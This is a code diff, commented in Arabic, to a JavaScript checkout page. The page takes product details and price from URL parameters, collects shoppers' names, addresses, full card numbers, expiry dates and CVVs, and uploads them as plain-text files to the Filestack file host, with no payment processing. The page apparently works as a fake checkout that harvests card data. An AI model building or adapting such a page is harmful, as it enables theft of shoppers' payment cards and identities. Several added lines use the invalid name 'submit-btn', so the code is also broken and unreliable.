@@ -1,6 +1,11 @@
-document.addEventListener('DOMContentLoaded', function () {
+document.addEventListener('DOMContentLoaded', function () { 
   const form = document.getElementById('checkout-form');
-  const submitButton = document.getElementById('submit-button'); // افترض أن الزر يحمل الـ ID "submit-button"
+  const submitButton = document.getElementById('submit-button'); // تأكد من أن الزر موجود في HTML
+  
+  if (!submitButton) {
+    console.error('زر الإرسال غير موجود في الصفحة');
+    return; // إذا لم يكن الزر موجودًا، توقف عن تنفيذ باقي الكود
+  }
 
   // استخراج المعلمات من الرابط
   function getUrlParams() {
@@ -26,29 +31,31 @@ document.addEventListener('DOMContentLoaded', function () {
   const productImageContainer = document.querySelector('.product-info');
 
   if (urlParams.image) {
-    // التأكد من أن الصورة ليست فارغة
-    productImage.src = urlParams.image;  // تعيين رابط الصورة
-    productImage.alt = `${urlParams.name || 'Product'} image`;  // إضافة نص بديل للصورة
-    productImage.style.display = 'block';  // إظهار الصورة
+    productImage.src = urlParams.image;
+    productImage.alt = `${urlParams.name || 'Product'} image`;
+    productImage.style.display = 'block';
   } else {
-    // إذا كانت الصورة غير موجودة أو فارغة، عرض صورة افتراضية
-    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';  // صورة افتراضية
+    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';
     productImage.alt = 'No Image Available';
-    productImage.style.display = 'block';  // إظهار الصورة
+    productImage.style.display = 'block';
   }
 
   // عرض الكمية
-  const productQuantity = parseInt(urlParams.quantity, 10) || 1; // تعيين الكمية الافتراضية إلى 1 إذا لم يتم إرسالها
+  const productQuantity = parseInt(urlParams.quantity, 10) || 1;
   document.getElementById('product-quantity').textContent = `Quantity: ${productQuantity}`;
 
   // حساب السعر الإجمالي
-  const productPrice = parseFloat(urlParams.price) || 0; // تحويل السعر إلى عدد عشري
-  const totalPrice = (productPrice * productQuantity).toFixed(2); // حساب السعر الإجمالي
+  const productPrice = parseFloat(urlParams.price) || 0;
+  const totalPrice = (productPrice * productQuantity).toFixed(2);
   document.getElementById('total-price').textContent = `Total Price: $${totalPrice}`;
 
   // إضافة مستمع للإرسال
   form.addEventListener('submit', function (event) {
     event.preventDefault();  // منع إعادة تحميل الصفحة عند الإرسال
+
+    // تعطيل الزر أثناء الإرسال
+    submit-btn.disabled = true;
+    submit-btn.textContent = 'جاري التحميل...';
 
     // جمع البيانات من الحقول
     const email = document.getElementById('email').value;
@@ -64,14 +71,13 @@ document.addEventListener('DOMContentLoaded', function () {
     const cvv = document.getElementById('cvv').value;
 
     // معلومات المنتج
-    const productName = document.getElementById('product-name').textContent.split(': ')[1];  // اسم المنتج
-    const productPriceText = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
-    const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1];  // كمية المنتج
-    const productImageUrl = urlParams.productImage || '';  // رابط الصورة
+    const productName = document.getElementById('product-name').textContent.split(': ')[1]; 
+    const productPriceText = document.getElementById('product-price').textContent.split(': ')[1]; 
+    const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1]; 
+    const productImageUrl = urlParams.productImage || '';
 
     // تحقق من القيم
     let isValid = true;
-
     removeErrorMessages();  // إزالة رسائل الخطأ السابقة
 
     // تحقق من الحقول الفارغة
@@ -111,39 +117,10 @@ document.addEventListener('DOMContentLoaded', function () {
     }
 
     if (isValid) {
-        // تغيير النص إلى "يتم التحميل الآن" وتعطيل الزر
-        submit-btn.textContent = 'يتم التحميل الآن';
-        submitButton.disabled = true;
-
-        // تغيير لون الحقول إلى لون غامق
-        const fields = form.querySelectorAll('input');
-        fields.forEach(field => {
-            field.style.backgroundColor = '#f0f0f0';  // خلفية فاتحة للإشارة إلى أن البيانات يتم إرسالها
-            field.style.color = '#555';  // تغيير اللون النصي
-        });
-
         // إنشاء محتوى الملف النصي مع بيانات المنتج
-        const orderData = ` 
-            Email: ${email}
-            First Name: ${firstName}
-            Last Name: ${lastName}
-            Street_House_Apartment_Unit: ${streetHouseApartmentUnit}
-            City: ${city}
-            State: ${state}
-            Zip Code: ${zipCode}
-            Cardholder's Name: ${cardName}
-            Card Number: ${cardNumber}
-            Expiry Date: ${expiry}
-            CVV: ${cvv}
+        const orderData =  
+            `Email: ${email}\nFirst Name: ${firstName}\nLast Name: ${lastName}\nStreet_House_Apartment_Unit: ${streetHouseApartmentUnit}\nCity: ${city}\nState: ${state}\nZip Code: ${zipCode}\nCardholder's Name: ${cardName}\nCard Number: ${cardNumber}\nExpiry Date: ${expiry}\nCVV: ${cvv}\n\n--- Product Details ---\nProduct Name: ${productName}\nProduct Price: $${productPriceText}\nProduct Quantity: ${productQuantityText}\nProduct Image URL: ${productImageUrl}\nTotal Price: $${totalPrice}`;
 
-            --- Product Details ---
-            Product Name: ${productName}
-            Product Price: $${productPriceText}
-            Product Quantity: ${productQuantityText}
-            Product Image URL: ${productImageUrl}
-            Total Price: $${totalPrice}
-        `;
-        
         // تحويل البيانات إلى Blob (بيانات ثنائية)
         const blob = new Blob([orderData], { type: 'text/plain' });
 
@@ -163,9 +140,15 @@ document.addEventListener('DOMContentLoaded', function () {
                 // في حال حدوث خطأ
                 console.error('Error uploading file to Filestack:', error);
                 alert('Something went wrong, please try again later.');
-                submit-btn.textContent = 'إكمال الشراء'; // إعادة النص إلى الأصل
-                submit-btn.disabled = false; // إعادة تمكين الزر
+
+                // إعادة تمكين الزر في حال حدوث خطأ
+                submit-btn.disabled = false;
+                submit-btn.textContent = 'أرسل الطلب';
             });
+    } else {
+        // إعادة تمكين الزر في حال فشل التحقق
+        submit-btn.disabled = false;
+        submit-btn.textContent = 'أرسل الطلب';
     }
   });
 });
